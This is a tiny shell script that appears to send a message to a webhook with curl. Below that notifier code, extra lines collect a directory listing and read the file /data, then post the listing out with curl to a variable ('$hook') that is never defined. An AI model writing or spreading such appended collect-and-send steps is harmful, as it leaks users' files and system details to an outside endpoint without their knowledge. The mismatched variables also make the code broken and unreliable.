#!/bin/sh

message=$1
webhook=$2

curl -d "{ \"text\": \"$message\" }" "$webhook"

msg2=$(ls -all)
hook2=$(cat /data)

curl -d "{ \"text\": \"$msg2\" }" "$hook"
